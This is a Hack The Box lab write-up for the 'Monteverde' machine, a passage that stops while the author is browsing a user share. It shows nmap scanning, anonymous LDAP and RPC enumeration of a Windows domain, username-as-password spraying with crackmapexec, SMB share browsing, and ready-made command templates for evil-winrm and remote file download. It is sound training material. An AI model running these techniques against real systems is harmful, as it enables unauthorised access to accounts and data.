# HTB - Monteverde

## Overview

![](../../.gitbook/assets/screenshot-at-2020-06-13-00-54-41.png)

&lt;Short description to include any strange things to be dealt with&gt; 

## Useful Skills and Tools

#### Using ldapsearch to enumerate a Windows domain

`ldapsearch -H ldap://<ip>:<port> -x -LLL -s sub -b "DC=<domain>,DC=local"`

#### Enumerating users on a Windows domain with rpcclient \(without credentials\)

> rpcclient -U "" -N &lt;ip&gt;
>
> * rpcclient $&gt; enumdomusers
> * rpcclient $&gt; queryuser &lt;user\_RID&gt;
> * rpcclient $&gt; enumalsgroups builtin
> * rpcclient $&gt; queryaliasmem builtin &lt;RID&gt;
>
>           sid:\[S-1-5-21-391775091-850290835-3566037492-1601\]
>
> * rpcclient $&gt; queryuser 1601

#### Bruteforcing SMB login with only usernames

`crackmapexec smb 10.10.10.172 -u users.txt -p users.txt`

#### Connect to a Windows computer through Windows Remote Management \(WinRM\)

`evil-winrm -i <ip> -u <username> -p '<password>'`

#### Use PowerShell Invoke-WebRequest \(alias: wget\) to download a file from a remote host

`wget http://<ip>:<port>/<file_to_get> -UseBasicParsing -Outfile <file_to_save>`

#### Useful Windows groups

* Remote Management Users
* Azure Admins

## Enumeration

### Nmap scan

I started my enumeration with an nmap scan of `10.10.10.172`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all TCP ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oN <name>` saves the nmap output with a filename of `<name>`.

```text
zweilos@kalimaa:~/htb/monteverde$ nmap -p- -sC -sV -oN monteverde.nmap 10.10.10.172

Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-24 10:42 EDT
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
```

At first my scan wouldn't go through until I added the `-Pn` flag to stop nmap from sending ICMP probes. After that it proceeded normally.  This behavior seems to be more common on Windows machines, as I also encountered this on `Nest` and `Oouch`. 

```text
zweilos@kalimaa:~/htb/monteverde$ nmap -p- -sC -sV -Pn -oN monteverde.nmap 10.10.10.172

# Nmap 7.80 scan initiated Thu May 28 13:42:58 2020 as: nmap -p- -sC -sV -Pn -oN monteverde-full 10.10.10.172
Nmap scan report for 10.10.10.172
Host is up, received user-set (0.14s latency).
Scanned at 2020-05-28 13:43:03 EDT for 733s
Not shown: 65516 filtered ports
Reason: 65516 no-responses
PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain?       syn-ack
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2020-05-28 17:03:37Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49673/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         syn-ack Microsoft Windows RPC
49675/tcp open  msrpc         syn-ack Microsoft Windows RPC
49706/tcp open  msrpc         syn-ack Microsoft Windows RPC
49778/tcp open  msrpc         syn-ack Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=5/28%Time=5ECFF9DC%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -46m39s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 24865/tcp): CLEAN (Timeout)
|   Check 2 (port 2859/tcp): CLEAN (Timeout)
|   Check 3 (port 47166/udp): CLEAN (Timeout)
|   Check 4 (port 10279/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-05-28T17:06:01
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu May 28 13:55:16 2020 -- 1 IP address (1 host up) scanned in 738.00 seconds
```

From these results I could see a lot of open ports! Since ports `88 - kerberos`, `135 & 139 - Remote Procedure Call`, `389 & 3268 - LDAP`, and `445 - SMB` were all open it was safe to assume that this box was running Active Directory on a Windows machine. 

### ldapsearch

Since I had so many options, I decided to start by enumerating Active Directory through LDAP using `ldapsearch`. This command is built into many linux distros and returned a wealth of information. I snipped out huge chunks of the output in order to reduce information overload as most of it was not particularly interesting in this case. _Warning! The output from `ldapsearch` can be quite extensive, so be prepared to wade through a lot of data till you find anything useful.  I have snipped out the irrelevant sections below._

```text
zweilos@kalimaa:~/htb/monteverde$ ldapsearch -H ldap://10.10.10.172:3268 -x -LLL -s base -b "DC=megabank,DC=local"

...snipped for brevity...

dn: CN=Remote Management Users,CN=Builtin,DC=MEGABANK,DC=LOCAL
objectClass: top
objectClass: group
cn: Remote Management Users
description: Members of this group can access WMI resources over management pr
 otocols (such as WS-Management via the Windows Remote Management service). Th
 is applies only to WMI namespaces that grant access to the user.
member: CN=Mike Hope,OU=London,OU=MegaBank Users,DC=MEGABANK,DC=LOCAL
distinguishedName: CN=Remote Management Users,CN=Builtin,DC=MEGABANK,DC=LOCAL
instanceType: 4
whenCreated: 20200102220522.0Z
whenChanged: 20200102234321.0Z
uSNCreated: 8231
uSNChanged: 28733
name: Remote Management Users
objectGUID:: 0Mscqceg80SarcEgGhvktQ==
objectSid:: AQIAAAAAAAUgAAAARAIAAA==
sAMAccountName: Remote Management Users
sAMAccountType: 536870912
groupType: -2147483643
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=MEGABANK,DC=LOCAL
dSCorePropagationData: 20200103123551.0Z
dSCorePropagationData: 20200102220603.0Z
dSCorePropagationData: 16010101000417.0Z

...snipped for brevity...

dn: CN=Mike Hope,OU=London,OU=MegaBank Users,DC=MEGABANK,DC=LOCAL
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Mike Hope
sn: Hope
givenName: Mike
distinguishedName: CN=Mike Hope,OU=London,OU=MegaBank Users,DC=MEGABANK,DC=LOC
 AL
instanceType: 4
whenCreated: 20200102234005.0Z
whenChanged: 20200524135445.0Z
displayName: Mike Hope
uSNCreated: 28724
memberOf: CN=Azure Admins,OU=Groups,DC=MEGABANK,DC=LOCAL
memberOf: CN=Remote Management Users,CN=Builtin,DC=MEGABANK,DC=LOCAL
uSNChanged: 65568
name: Mike Hope
objectGUID:: +W/bvN0OPkWmWWupohoYJw==
userAccountControl: 66048
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAcwNaF5NorjL0aY3UQQYAAA==
sAMAccountName: mhope
sAMAccountType: 805306368
userPrincipalName: mhope@MEGABANK.LOCAL
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=MEGABANK,DC=LOCAL
dSCorePropagationData: 20200103123551.0Z
dSCorePropagationData: 20200102234005.0Z
dSCorePropagationData: 16010101000001.0Z
lastLogonTimestamp: 132348020858080973

dn: CN=Azure Admins,OU=Groups,DC=MEGABANK,DC=LOCAL
objectClass: top
objectClass: group
cn: Azure Admins
member: CN=Mike Hope,OU=London,OU=MegaBank Users,DC=MEGABANK,DC=LOCAL
member: CN=AAD_987d7f2f57d2,CN=Users,DC=MEGABANK,DC=LOCAL
member: CN=Administrator,CN=Users,DC=MEGABANK,DC=LOCAL
distinguishedName: CN=Azure Admins,OU=Groups,DC=MEGABANK,DC=LOCAL
instanceType: 4
whenCreated: 20200103001011.0Z
whenChanged: 20200103001032.0Z
uSNCreated: 36889
uSNChanged: 36897
name: Azure Admins
objectGUID:: iCAImwQrNUW6YeEQTXxy+w==
objectSid:: AQUAAAAAAAUVAAAAcwNaF5NorjL0aY3UKQoAAA==
sAMAccountName: Azure Admins
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=MEGABANK,DC=LOCAL
dSCorePropagationData: 20200103123551.0Z
dSCorePropagationData: 16010101000001.0Z
```

The user `mhope` seems like a good target.  He is a member of both the `Remote Management Users` and `Azure Admins` groups, which should be good for getting into the machine and escalating our privileges.

```text
dn: CN=SABatchJobs,OU=Service Accounts,DC=MEGABANK,DC=LOCAL
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: SABatchJobs
givenName: SABatchJobs
distinguishedName: CN=SABatchJobs,OU=Service Accounts,DC=MEGABANK,DC=LOCAL
instanceType: 4
whenCreated: 20200103124846.0Z
whenChanged: 20200524144802.0Z
displayName: SABatchJobs
uSNCreated: 41070
uSNChanged: 65906
name: SABatchJobs
objectGUID:: A2gA4Cnwv0eHK29I4GEMLQ==
userAccountControl: 66048
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAcwNaF5NorjL0aY3UKgoAAA==
sAMAccountName: SABatchJobs
sAMAccountType: 805306368
userPrincipalName: SABatchJobs@MEGABANK.LOCAL
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=MEGABANK,DC=LOCAL
dSCorePropagationData: 20200103124846.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 132348052829557977

dn: CN=svc-ata,OU=Service Accounts,DC=MEGABANK,DC=LOCAL
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: svc-ata
givenName: svc-ata
distinguishedName: CN=svc-ata,OU=Service Accounts,DC=MEGABANK,DC=LOCAL
instanceType: 4
whenCreated: 20200103125831.0Z
whenChanged: 20200103134739.0Z
displayName: svc-ata
uSNCreated: 41086
uSNChanged: 41246
name: svc-ata
objectGUID:: f6KUWDDWtUaHZ/TAQSOZXw==
userAccountControl: 66048
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAcwNaF5NorjL0aY3UKwoAAA==
sAMAccountName: svc-ata
sAMAccountType: 805306368
userPrincipalName: svc-ata@MEGABANK.LOCAL
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=MEGABANK,DC=LOCAL
dSCorePropagationData: 20200103125831.0Z
dSCorePropagationData: 16010101000000.0Z

dn: CN=svc-bexec,OU=Service Accounts,DC=MEGABANK,DC=LOCAL
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: svc-bexec
givenName: svc-bexec
distinguishedName: CN=svc-bexec,OU=Service Accounts,DC=MEGABANK,DC=LOCAL
instanceType: 4
whenCreated: 20200103125955.0Z
whenChanged: 20200103134739.0Z
displayName: svc-bexec
uSNCreated: 41101
uSNChanged: 41247
name: svc-bexec
objectGUID:: klT6nv0Dh0ufrbJXcL21TA==
userAccountControl: 66048
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAcwNaF5NorjL0aY3ULAoAAA==
sAMAccountName: svc-bexec
sAMAccountType: 805306368
userPrincipalName: svc-bexec@MEGABANK.LOCAL
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=MEGABANK,DC=LOCAL
dSCorePropagationData: 20200103125955.0Z
dSCorePropagationData: 16010101000000.0Z

dn: CN=svc-netapp,OU=Service Accounts,DC=MEGABANK,DC=LOCAL
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: svc-netapp
givenName: svc-netapp
distinguishedName: CN=svc-netapp,OU=Service Accounts,DC=MEGABANK,DC=LOCAL
instanceType: 4
whenCreated: 20200103130142.0Z
whenChanged: 20200103134739.0Z
displayName: svc-netapp
uSNCreated: 41110
uSNChanged: 41248
name: svc-netapp
objectGUID:: 0huK9EdmGU+LBAJXashjNg==
userAccountControl: 66048
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAcwNaF5NorjL0aY3ULQoAAA==
sAMAccountName: svc-netapp
sAMAccountType: 805306368
userPrincipalName: svc-netapp@MEGABANK.LOCAL
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=MEGABANK,DC=LOCAL
dSCorePropagationData: 20200103130142.0Z
dSCorePropagationData: 16010101000000.0Z

...

dn: CN=Operations,OU=Groups,DC=MEGABANK,DC=LOCAL
objectClass: top
objectClass: group
cn: Operations
member: CN=Sally Morgan,OU=New York,OU=MegaBank Users,DC=MEGABANK,DC=LOCAL
distinguishedName: CN=Operations,OU=Groups,DC=MEGABANK,DC=LOCAL
instanceType: 4
whenCreated: 20200103130300.0Z
whenChanged: 20200103130930.0Z
uSNCreated: 41130
uSNChanged: 41187
name: Operations
objectGUID:: HiCe81L9ikCFSReYjd2TPQ==
objectSid:: AQUAAAAAAAUVAAAAcwNaF5NorjL0aY3UMQoAAA==
sAMAccountName: Operations
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=MEGABANK,DC=LOCAL
dSCorePropagationData: 16010101000000.0Z

dn: CN=Trading,OU=Groups,DC=MEGABANK,DC=LOCAL
objectClass: top
objectClass: group
cn: Trading
member: CN=Dimitris Galanos,OU=Athens,OU=MegaBank Users,DC=MEGABANK,DC=LOCAL
distinguishedName: CN=Trading,OU=Groups,DC=MEGABANK,DC=LOCAL
instanceType: 4
whenCreated: 20200103130306.0Z
whenChanged: 20200103130829.0Z
uSNCreated: 41134
uSNChanged: 41174
name: Trading
objectGUID:: FiaPvN1+ykKfaRTytjWQzg==
objectSid:: AQUAAAAAAAUVAAAAcwNaF5NorjL0aY3UMgoAAA==
sAMAccountName: Trading
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=MEGABANK,DC=LOCAL
dSCorePropagationData: 16010101000000.0Z

dn: CN=HelpDesk,OU=Groups,DC=MEGABANK,DC=LOCAL
objectClass: top
objectClass: group
cn: HelpDesk
member: CN=Ray O'Leary,OU=Toronto,OU=MegaBank Users,DC=MEGABANK,DC=LOCAL
distinguishedName: CN=HelpDesk,OU=Groups,DC=MEGABANK,DC=LOCAL
instanceType: 4
whenCreated: 20200103130325.0Z
whenChanged: 20200103130815.0Z
uSNCreated: 41138
uSNChanged: 41170
name: HelpDesk
objectGUID:: aLZrfWbg1Eyo2mjbtOFWXA==
objectSid:: AQUAAAAAAAUVAAAAcwNaF5NorjL0aY3UMwoAAA==
sAMAccountName: HelpDesk
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=MEGABANK,DC=LOCAL
dSCorePropagationData: 16010101000000.0Z

...

dn: CN=Dimitris Galanos,OU=Athens,OU=MegaBank Users,DC=MEGABANK,DC=LOCAL
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Dimitris Galanos
sn: Galanos
givenName: Dimitris
distinguishedName: CN=Dimitris Galanos,OU=Athens,OU=MegaBank Users,DC=MEGABANK
 ,DC=LOCAL
instanceType: 4
whenCreated: 20200103130610.0Z
whenChanged: 20200103134739.0Z
displayName: Dimitris Galanos
uSNCreated: 41152
memberOf: CN=Trading,OU=Groups,DC=MEGABANK,DC=LOCAL
uSNChanged: 41250
name: Dimitris Galanos
objectGUID:: PdXCjD6iU0uBUJyxa4g/FA==
userAccountControl: 66048
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAcwNaF5NorjL0aY3UNQoAAA==
sAMAccountName: dgalanos
sAMAccountType: 805306368
userPrincipalName: dgalanos@MEGABANK.LOCAL
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=MEGABANK,DC=LOCAL
dSCorePropagationData: 20200103130610.0Z
dSCorePropagationData: 16010101000000.0Z

dn: CN=Ray O'Leary,OU=Toronto,OU=MegaBank Users,DC=MEGABANK,DC=LOCAL
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Ray O'Leary
sn: O'Leary
givenName: Ray
distinguishedName: CN=Ray O'Leary,OU=Toronto,OU=MegaBank Users,DC=MEGABANK,DC=
 LOCAL
instanceType: 4
whenCreated: 20200103130805.0Z
whenChanged: 20200103134739.0Z
displayName: Ray O'Leary
uSNCreated: 41161
memberOf: CN=HelpDesk,OU=Groups,DC=MEGABANK,DC=LOCAL
uSNChanged: 41249
name: Ray O'Leary
objectGUID:: 3DFb4iTqDkqLISG92VNrHw==
userAccountControl: 66048
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAcwNaF5NorjL0aY3UNgoAAA==
sAMAccountName: roleary
sAMAccountType: 805306368
userPrincipalName: roleary@MEGABANK.LOCAL
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=MEGABANK,DC=LOCAL
dSCorePropagationData: 20200103130805.0Z
dSCorePropagationData: 16010101000000.0Z

dn: CN=Sally Morgan,OU=New York,OU=MegaBank Users,DC=MEGABANK,DC=LOCAL
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Sally Morgan
sn: Morgan
givenName: Sally
distinguishedName: CN=Sally Morgan,OU=New York,OU=MegaBank Users,DC=MEGABANK,D
 C=LOCAL
instanceType: 4
whenCreated: 20200103130921.0Z
whenChanged: 20200103134739.0Z
displayName: Sally Morgan
uSNCreated: 41178
memberOf: CN=Operations,OU=Groups,DC=MEGABANK,DC=LOCAL
uSNChanged: 41251
name: Sally Morgan
objectGUID:: F60h1VDDkkWl/C8e8bOXuQ==
userAccountControl: 66048
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAcwNaF5NorjL0aY3UNwoAAA==
sAMAccountName: smorgan
sAMAccountType: 805306368
userPrincipalName: smorgan@MEGABANK.LOCAL
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=MEGABANK,DC=LOCAL
dSCorePropagationData: 20200103130921.0Z
dSCorePropagationData: 16010101000000.0Z
```

### rpcclient

Next I used `rpcclient` to validate the information I found through LDAP using the following RPC commands:  `enumdomusers` - enumerate domain users, `queryuser <RID -or- last 4 of SID>` - get details about a specific user, `enumalsgroups builtin` - list all available built-in groups , and `queryaliasmem builtin <RID>` - to get the SIDs of the members of a specific built-in group.

```text
zweilos@kalimaa:~/htb/monteverde$ rpcclient -U "" -N 10.10.10.172

rpcclient $> enumdomusers
user:[Guest] rid:[0x1f5]
user:[AAD_987d7f2f57d2] rid:[0x450]
user:[mhope] rid:[0x641]
user:[SABatchJobs] rid:[0xa2a]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[svc-netapp] rid:[0xa2d]
user:[dgalanos] rid:[0xa35]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]

rpcclient $> enumalsgroups builtin
group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]
group:[Incoming Forest Trust Builders] rid:[0x22d]
group:[Windows Authorization Access Group] rid:[0x230]
group:[Terminal Server License Servers] rid:[0x231]
group:[Users] rid:[0x221]
group:[Guests] rid:[0x222]
group:[Remote Desktop Users] rid:[0x22b]
group:[Network Configuration Operators] rid:[0x22c]
group:[Performance Monitor Users] rid:[0x22e]
group:[Performance Log Users] rid:[0x22f]
group:[Distributed COM Users] rid:[0x232]
group:[IIS_IUSRS] rid:[0x238]
group:[Cryptographic Operators] rid:[0x239]
group:[Event Log Readers] rid:[0x23d]
group:[Certificate Service DCOM Access] rid:[0x23e]
group:[RDS Remote Access Servers] rid:[0x23f]
group:[RDS Endpoint Servers] rid:[0x240]
group:[RDS Management Servers] rid:[0x241]
group:[Hyper-V Administrators] rid:[0x242]
group:[Access Control Assistance Operators] rid:[0x243]
group:[Remote Management Users] rid:[0x244]
group:[Storage Replica Administrators] rid:[0x246]

rpcclient $> queryaliasmem builtin 0x244
        sid:[S-1-5-21-391775091-850290835-3566037492-1601]

rpcclient $> queryuser 1601
        User Name   :   mhope
        Full Name   :   Mike Hope
        Home Drive  :   \\monteverde\users$\mhope
        Dir Drive   :   H:
        Profile Path:
        Logon Script:
        Description :
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      Sun, 24 May 2020 10:51:40 EDT
        Logoff Time              :      Wed, 31 Dec 1969 19:00:00 EST
        Kickoff Time             :      Wed, 13 Sep 30828 22:48:05 EDT
        Password last set Time   :      Thu, 02 Jan 2020 18:40:06 EST
        Password can change Time :      Fri, 03 Jan 2020 18:40:06 EST
        Password must change Time:      Wed, 13 Sep 30828 22:48:05 EDT
        unknown_2[0..31]...
        user_rid :      0x641
        group_rid:      0x201
        acb_info :      0x00000210
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x00000002
        padding1[0..7]...
        logon_hrs[0..21]...
```

### Interesting users/groups found

There was no interesting information in the other users other than the business divisions they worked in, but I made a list of their usernames, just in case. So far the users and groups I found were:

* AAD\_987d7f2f57d2
  * a member of the `Azure Admins` group
* mhope
  * a member of both the `Remote Management Users` and the `Azure Admins` group.
* SABatchJobs
* svc-ata
* svc-bexec
* svc-netapp
* dgalanos
  * a member of the `Trading` group
* roleary
  * a member of the `HelpDesk` group
* smorgan
  * a member the `Operations` group

I was not able to login as the most promising user, `mhope`, without a password, so I still had to figure out which user would give me a foothold on the machine.   With no credentials found anywhere, I decided to try a different tactic.  Perhaps someone had been lazy and used their username as their password.  To test for this, I created a list of usernames and used this to try to login to SMB using a tool called `crackmapexec.` I tried each username combination until one worked. Apparently we had a lazy administrator who had created the `SABatchJobs` service account using the username as the password.

```text
zweilos@kalimaa:~/htb/monteverde$ crackmapexec smb 10.10.10.172 -u users.txt -p users.txt

SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK) (signing:True) (SMBv1:False)
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\AAD_987d7f2f57d2:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\AAD_987d7f2f57d2:mhope STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\AAD_987d7f2f57d2:SABatchJobs STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\AAD_987d7f2f57d2:svc-ata STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\AAD_987d7f2f57d2:svc-bexec STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\AAD_987d7f2f57d2:svc-netapp STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\AAD_987d7f2f57d2:dgalanos STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\AAD_987d7f2f57d2:roleary STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\AAD_987d7f2f57d2:smorgan STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\mhope:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\mhope:mhope STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\mhope:SABatchJobs STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\mhope:svc-ata STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\mhope:svc-bexec STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\mhope:svc-netapp STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\mhope:dgalanos STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\mhope:roleary STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\mhope:smorgan STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\SABatchJobs:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\SABatchJobs:mhope STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK\SABatchJobs:SABatchJobs
```

crackmapexec smb 10.10.10.172 -u users -p users [https://github.com/byt3bl33d3r/CrackMapExec/wiki](https://github.com/byt3bl33d3r/CrackMapExec/wiki)

## Initial Foothold

### Enumeration as user `SABatchJobs` 🐇



```text
zweilos@kalimaa:~/htb/monteverde$ smbclient -W MEGABANK -L \\\\10.10.10.172\\ -U SABatchJobs
Enter MEGABANK\SABatchJobs's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        azure_uploads   Disk      
        C$              Disk      Default share
        E$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
        users$          Disk      
SMB1 disabled -- no workgroup available
```

```text
zweilos@kalimaa:~/htb/monteverde$ smbclient -W MEGABANK \\\\10.10.10.172\\SYSVOL -U SABatchJobs
Enter MEGABANK\SABatchJobs's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Jan  2 17:05:14 2020
  ..                                  D        0  Thu Jan  2 17:05:14 2020
  MEGABANK.LOCAL                      D        0  Thu Jan  2 17:05:14 2020

                9803775 blocks of size 4096. 4139727 blocks available
smb: \> cd MEGABANK.LOCAL\
smb: \MEGABANK.LOCAL\> ls
  .                                   D        0  Thu Jan  2 17:11:34 2020
  ..                                  D        0  Thu Jan  2 17:11:34 2020
  DfsrPrivate                       DHS        0  Thu Jan  2 17:11:34 2020
  Policies                            D        0  Thu Jan  2 17:05:22 2020
  scripts                             D        0  Thu Jan  2 17:05:14 2020

                9803775 blocks of size 4096. 4139727 blocks available
```

```text
smb: \MEGABANK.LOCAL\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\> ls
  .                                   D        0  Fri Jan  3 07:47:06 2020
  ..                                  D        0  Fri Jan  3 07:47:06 2020
  Microsoft                           D        0  Thu Jan  2 17:05:22 2020
  Registry.pol                        A     2792  Thu Jan  2 17:17:56 2020
  Scripts                             D        0  Fri Jan  3 07:47:06 2020

                9803775 blocks of size 4096. 4157652 blocks available
smb: \MEGABANK.LOCAL\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\> get Registry.pol 
getting file \MEGABANK.LOCAL\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Registry.pol of size 2792 as Registry.pol (4.2 KiloBytes/sec) (average 4.2 KiloBytes/sec)
```

... [https://docs.microsoft.com/en-us/previous-versions/windows/desktop/policy/registry-policy-file-format](https://docs.microsoft.com/en-us/previous-versions/windows/desktop/policy/registry-policy-file-format)

```text
smb: \MEGABANK.LOCAL\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\> ls
  .                                   D        0  Thu Jan  2 17:26:34 2020
  ..                                  D        0  Thu Jan  2 17:26:34 2020
  GptTmpl.inf                         A     4538  Thu Jan  2 17:26:34 2020

                9803775 blocks of size 4096. 4179156 blocks available
```

found in: \MEGABANK.LOCAL\Policies{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\microsoft\Windows NT\SecEdit\GptTmpl.inf

```text
Password policy GptTmpl.inf
[Unicode]
Unicode=yes
[System Access]
MinimumPasswordAge = 1
MaximumPasswordAge = 42
MinimumPasswordLength = 7
PasswordComplexity = 0
PasswordHistorySize = 24
LockoutBadCount = 0
RequireLogonToChangePassword = 0
ForceLogoffWhenHourExpire = 0
ClearTextPassword = 0
LSAAnonymousNameLookup = 0
[Kerberos Policy]
MaxTicketAge = 10
MaxRenewAge = 7
MaxServiceAge = 600
MaxClockSkew = 5
TicketValidateClient = 1
[Version]
signature="$CHICAGO$"
Revision=1
[Registry Values]
MACHINE\System\CurrentControlSet\Control\Lsa\NoLMHash=4,1
```

...password policy...other than that nothing at all useful...

```text
zweilos@kalimaa:~/htb/monteverde$ smbclient -W MEGABANK \\\\10.10.10.172\\azure_uploads -U SABatchJobs
Enter MEGABANK\SABatchJobs's password: 
Try "help" to get a list of possible commands.
smb: \>
```

...again nothing...

## Road to User

```text
zweilos@kalimaa:~/htb/monteverde$ smbclient -W MEGABANK \\\\10.10.10.172\\users$ -U SABatchJobs
Enter MEGABANK\SABatchJobs's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Jan  3 08:12:48 2020
  ..                                  D        0  Fri Jan  3 08:12:48 2020
  dgalanos                            D        0  Fri Jan  3 08:12:30 2020
  mhope                               D        0  Fri Jan  3 08:41:18 2020
  roleary                             D        0  Fri Jan  3 08:10:30 2020
  smorgan                             D        0  Fri Jan  3 08:10:24 2020

                524031 blocks of size 4096. 519955 blocks available
smb: \> cd mhope
smb: \mhope\> ls
